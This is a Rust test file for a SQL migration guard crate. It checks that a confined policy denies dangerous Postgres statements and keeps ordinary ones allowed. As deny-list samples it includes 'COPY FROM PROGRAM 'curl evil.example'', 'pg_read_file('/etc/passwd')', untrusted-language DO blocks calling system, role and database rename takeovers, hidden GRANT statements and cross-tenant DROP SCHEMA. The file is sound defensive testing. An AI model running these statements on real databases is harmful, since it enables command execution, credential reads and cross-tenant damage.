//! Focused public-API smoke tests for the extracted `zero-migrate-guard` crate.
//!
//! The exhaustive guard behaviour-lock suite (Platform/Trusted widening, vendor
//! lowering, the data-security IR gate) lives in the engine crate, because those
//! scenarios drive the guard THROUGH the engine's `render::lower` / `conn` apply
//! pipeline (which this leaf crate deliberately cannot depend on). These smoke
//! tests pin the guard's own public surface: the confined deny-list, the
//! cross-schema confinement, the string-literal extractor, and the analysis
//! re-exports.

mod support;

use zero_migrate_guard::guard::{
    check_raw_view_body_text, extract_string_literals, GuardConfig, GuardError, GuardMode, SqlGuard,
};
use zero_migrate_ir::dialect::SqlDialect;
use zero_migrate_ir::policy::SchemaScope;

fn confined() -> SqlGuard {
    SqlGuard::new(GuardConfig::from_policy(
        support::no_inject("app1"),
        SqlDialect::Postgres,
    ))
}

#[test]
fn explicit_confined_charter_fixture_composes() {
    let cfg = GuardConfig::from_policy(support::confined_charter(), SqlDialect::Postgres);
    assert_eq!(
        cfg.schema_scope(),
        Some(SchemaScope::Single("app".to_string()))
    );
}

#[test]
fn dialect_selection_preserves_policy_and_enforces_non_postgres_guard() {
    let cfg = GuardConfig::from_policy_with_mode(
        support::no_inject("app1"),
        SqlDialect::Postgres,
        GuardMode::Off,
    );

    let postgres = cfg.clone().for_dialect(SqlDialect::Postgres);
    assert_eq!(postgres.guard_mode(), GuardMode::Off);
    assert_eq!(
        postgres.schema_scope(),
        Some(SchemaScope::Single("app1".to_string()))
    );

    let sqlite = cfg.for_dialect(SqlDialect::Sqlite);
    assert_eq!(sqlite.guard_mode(), GuardMode::Enforced);
    assert_eq!(
        sqlite.schema_scope(),
        Some(SchemaScope::Single("app1".to_string()))
    );
}

#[test]
fn raw_view_scanner_evaluates_schema_scope_without_a_policy_fixture() {
    let scope = SchemaScope::Single("app1".to_string());
    check_raw_view_body_text("SELECT * FROM app1.widgets", "view body", Some(&scope))
        .expect("the explicit scope admits its own schema");

    let err = check_raw_view_body_text("SELECT * FROM other.widgets", "view body", Some(&scope))
        .expect_err("the explicit scope rejects another schema");
    assert!(matches!(err, GuardError::CrossSchema { .. }));

    let err = check_raw_view_body_text("SELECT pg_read_file('/etc/passwd')", "view body", None)
        .expect_err("the body deny-list remains active without schema confinement");
    assert!(matches!(err, GuardError::Denied { .. }));
}

#[test]
fn confined_allows_a_plain_create_table() {
    let report = confined()
        .check("CREATE TABLE app1.widgets (id int)")
        .expect("a plain confined-schema CREATE TABLE must pass the guard");
    assert!(!report.destructive, "CREATE TABLE is not destructive");
}

#[test]
fn confined_denies_a_copy_program_rce() {
    // `COPY ... FROM PROGRAM` is arbitrary host command execution — the deny-list
    // must reject it under the confined (creator/AI) posture.
    let err = confined()
        .check("COPY app1.t FROM PROGRAM 'curl evil.example'")
        .expect_err("COPY FROM PROGRAM is RCE and must be denied");
    assert!(
        matches!(err, GuardError::Denied { .. }),
        "expected a hard Denied, got {err:?}"
    );
}

#[test]
fn confined_flags_a_drop_table_as_destructive() {
    let report = confined()
        .check("DROP TABLE app1.widgets")
        .expect("DROP TABLE is reversible-structure destructive, not denied outright");
    assert!(report.destructive, "DROP TABLE must be flagged destructive");
}

#[test]
fn confined_denies_a_cross_schema_reference() {
    let err = confined()
        .check("CREATE TABLE other_tenant.secrets (id int)")
        .expect_err("a non-confined schema reference is a cross-tenant violation");
    assert!(
        matches!(
            err,
            GuardError::CrossSchema { .. } | GuardError::Denied { .. }
        ),
        "expected a cross-schema/deny error, got {err:?}"
    );
}

#[test]
fn extract_string_literals_is_multibyte_faithful() {
    let lits = extract_string_literals("SELECT 'héllo', 'wörld'");
    assert_eq!(lits, vec!["héllo".to_string(), "wörld".to_string()]);
}

#[test]
fn non_ascii_relation_name_reaches_a_verdict_instead_of_panicking() {
    // The `pg_` catalog-prefix test byte-sliced `relname[..3]` behind a byte-length
    // check, so an identifier whose third byte fell inside a multi-byte character
    // aborted the process before any allow/deny decision. A guard that panics on
    // untrusted input fails open by taking the caller down with it, so every
    // well-formed UTF-8 identifier must produce a verdict.
    let guard = confined();
    for sql in [
        r#"SELECT * FROM "abé""#,
        r#"SELECT * FROM "a日本""#,
        r#"INSERT INTO "abé" VALUES (1)"#,
        r#"CREATE TABLE app1."abé" (x int)"#,
        r#"SELECT 1; SELECT * FROM "abé""#,
    ] {
        let _ = guard.check(sql);
    }
}

#[test]
fn analysis_reexports_are_reachable() {
    // The engine re-exports these through the guard crate; assert they resolve.
    let advisories = zero_migrate_guard::analyze::analyze("CREATE INDEX i ON app1.t (a)");
    let _ = advisories; // shape-only: analysis never denies.
    let classified = zero_migrate_guard::classify::classify("SELECT 1");
    assert!(
        classified.is_ok(),
        "a plain SELECT must classify without a parse error"
    );
}

#[test]
fn renaming_a_role_database_or_foreign_schema_is_denied() {
    // `RenameStmt` is one node for `ALTER <anything> RENAME TO`, and role, database,
    // and schema renames carry their target in scalar slots the cross-schema walk
    // never visits. Reaching a verdict only for TABLE and COLUMN let a rename confer
    // exactly what the other spellings hard-deny.
    let g = confined();
    for sql in [
        "ALTER ROLE postgres RENAME TO pwned",
        "ALTER USER app1 RENAME TO postgres",
        "ALTER DATABASE postgres RENAME TO pwned",
        // Renaming a schema you do not own takes it away.
        "ALTER SCHEMA control RENAME TO app_stolen",
        // Renaming your own onto a name you do not own claims that one.
        "ALTER SCHEMA app1 RENAME TO control",
    ] {
        let err = g
            .check(sql)
            .expect_err(&format!("must not be admitted: {sql}"));
        assert!(
            matches!(
                err,
                GuardError::Denied { .. } | GuardError::CrossSchema { .. }
            ),
            "expected a deny/cross-schema verdict for `{sql}`, got {err:?}"
        );
    }

    // A rename that names its target through `relation` was already covered, and a
    // table rename inside the owned schema must still pass.
    g.check("ALTER TABLE app1.widgets RENAME TO gadgets")
        .expect("an owned-schema table rename stays allowed");
}

#[test]
fn a_scope_owning_no_schema_permits_no_schema() {
    // `GuardConfig::schema_scope` returns `Single("")` for a policy that owns no
    // schema at all, which is the tightest posture there is. The body scanner kept
    // its own copy of the admission match, and that copy had an extra arm treating
    // the empty name as "permit everything" - so the one policy that should admit
    // nothing admitted every cross-tenant reference.
    let owns_nothing = SchemaScope::Single(String::new());
    for body in [
        "SELECT * FROM control.users",
        "SELECT * FROM other_tenant.secrets",
        "SELECT * FROM app1.widgets",
    ] {
        let err = check_raw_view_body_text(body, "view body", Some(&owns_nothing))
            .expect_err(&format!("owning no schema must not admit: {body}"));
        assert!(
            matches!(err, GuardError::CrossSchema { .. }),
            "expected a cross-schema verdict for `{body}`, got {err:?}"
        );
    }

    // Permitting everything stays available, but only by asking for it.
    check_raw_view_body_text(
        "SELECT * FROM control.users",
        "view body",
        Some(&SchemaScope::Unconfined),
    )
    .expect("an explicit Unconfined posture still admits any schema");
}

#[test]
fn an_anonymous_block_in_an_untrusted_language_is_denied() {
    // `DO [LANGUAGE lang] $$..$$` executes an anonymous block in an arbitrary
    // procedural language, so it carries the same RCE reach as `CREATE FUNCTION`.
    // `DO` sat in the unconditionally-safe statement list and never had its language
    // read, so the block spelling was admitted while the function spelling of the
    // same body was denied.
    let g = confined();
    for sql in [
        "DO LANGUAGE plpythonu $$ import os $$",
        "DO LANGUAGE plperlu $$ system(\"id\"); $$",
        // Quoting the language name must not evade the check.
        "DO LANGUAGE \"plpythonu\" $$ import os $$",
    ] {
        let err = g
            .check(sql)
            .expect_err(&format!("untrusted language must be denied: {sql}"));
        assert!(
            matches!(err, GuardError::Denied { .. }),
            "expected a hard Denied for `{sql}`, got {err:?}"
        );
    }

    // An absent LANGUAGE is plpgsql, which is trusted and stays allowed.
    g.check("DO $$ BEGIN NULL; END $$")
        .expect("a plain plpgsql block stays allowed");
}

#[test]
fn a_bare_schema_name_is_confined_in_reindex_and_comment() {
    // `REINDEX SCHEMA <s>` and `COMMENT ON SCHEMA <s>` carry their target as a bare
    // string rather than a relation or a qualified list, which is the one slot shape
    // the cross-schema walk does not visit. Both statement kinds sat in the
    // unconditionally-safe list, so they reached any schema at all.
    //
    // REINDEX is the one that bites: rebuilding every index in a schema you do not own
    // takes an ACCESS EXCLUSIVE lock on each of its tables, so it is a cross-tenant
    // outage, not just a metadata write.
    let g = confined();
    for sql in ["REINDEX SCHEMA control", "COMMENT ON SCHEMA control IS 'x'"] {
        let err = g
            .check(sql)
            .expect_err(&format!("a foreign schema must not be reachable: {sql}"));
        assert!(
            matches!(err, GuardError::CrossSchema { .. }),
            "expected a cross-schema verdict for `{sql}`, got {err:?}"
        );
    }

    // `REINDEX DATABASE` / `REINDEX SYSTEM` reach past any schema at all.
    let err = g
        .check("REINDEX DATABASE postgres")
        .expect_err("a database-wide reindex is out of a project migrator's remit");
    assert!(matches!(err, GuardError::Denied { .. }), "got {err:?}");

    // The owned schema stays reachable through both.
    g.check("REINDEX SCHEMA app1")
        .expect("reindexing the owned schema stays allowed");
    g.check("COMMENT ON SCHEMA app1 IS 'x'")
        .expect("commenting on the owned schema stays allowed");
}

#[test]
fn a_body_hiding_a_privilege_verb_is_denied() {
    // The body token scan is the backstop for PL/pgSQL text that never parses as
    // top-level SQL. It carried needles for `CREATE ROLE` and friends but none for
    // the privilege verbs the top level also hard-denies, so `GRANT` hidden in
    // EXECUTE text passed while `CREATE ROLE` in the same shape was caught.
    let g = confined();
    for sql in [
        "DO $$ BEGIN EXECUTE 'GRANT ALL ON app1.t ' || 'TO PUBLIC'; END $$",
        "DO $$ BEGIN EXECUTE 'REVOKE ALL ON app1.t ' || 'FROM app1'; END $$",
        "DO $$ BEGIN EXECUTE 'ALTER FUNCTION app1.f() SECURITY DEFINER'; END $$",
        "DO $$ BEGIN EXECUTE 'ALTER DEFAULT PRIVILEGES GRANT ALL ON TABLES TO PUBLIC'; END $$",
    ] {
        let err = g
            .check(sql)
            .expect_err(&format!("a hidden privilege verb must be denied: {sql}"));
        assert!(
            matches!(err, GuardError::Denied { .. }),
            "expected a hard Denied for `{sql}`, got {err:?}"
        );
    }

    // Identifier boundaries, so an ordinary column name carrying a needle as a
    // substring does not trip the scan.
    g.check("CREATE TABLE app1.t (grant_total int, revoked_at timestamptz)")
        .expect("a column named grant_total is not a GRANT");
}

/// A schema you cannot CREATE, you also cannot DROP.
///
/// `grants_drop_object` answered `OBJECT_SCHEMA` with a GLOBAL `schema.create_schema`
/// query that never looked at which schema was being dropped, while `CreateSchemaStmt`
/// checks the name at its target. Under a charter granting `create_schema` over `all`
/// with `cross_schema` scoped - the shape this engine's own operator fixture builds -
/// that let a migration drop a schema it was refused permission to create.
///
/// The name is a bare single-part String in `DropStmt.objects`, and the cross-schema
/// walk needs 2+ parts, so nothing downstream caught it either.
#[test]
fn a_foreign_schema_cannot_be_dropped_even_when_create_schema_is_global() {
    // The shape this repo's own operator fixture builds: create_schema granted
    // globally, cross_schema scoped to the owned set.
    let charter = r#"policy_version = 1
[[grant]]
key = "schema.cross_schema"
value = true
scope = { include = ["app1"] }
[[grant]]
key = "schema.create_schema"
value = true
scope = "all"
[[grant]]
key = "safety.destructive_ops"
value = "allow"
scope = "all"
"#;
    let g = SqlGuard::new(GuardConfig::from_policy(
        support::effective_policy_from_charter_toml(charter),
        SqlDialect::Postgres,
    ));
    for sql in [
        "DROP SCHEMA control CASCADE",
        // One owned name in the list does not launder the foreign one.
        "DROP SCHEMA control, app1 CASCADE",
    ] {
        let err = g
            .check(sql)
            .expect_err(&format!("a foreign schema must not be droppable: {sql}"));
        assert!(
            matches!(err, GuardError::CrossSchema { .. }),
            "expected a cross-schema verdict for `{sql}`, got {err:?}"
        );
    }

    // The asymmetry that made this a bug rather than a posture: create was already
    // confined at its target.
    let err = g
        .check("CREATE SCHEMA control")
        .expect_err("creating a foreign schema was already refused");
    assert!(matches!(err, GuardError::CrossSchema { .. }), "got {err:?}");

    // Dropping the owned schema stays allowed, and stays flagged destructive.
    let report = g
        .check("DROP SCHEMA app1 CASCADE")
        .expect("dropping the owned schema stays allowed");
    assert!(report.destructive, "DROP SCHEMA must remain destructive");
}
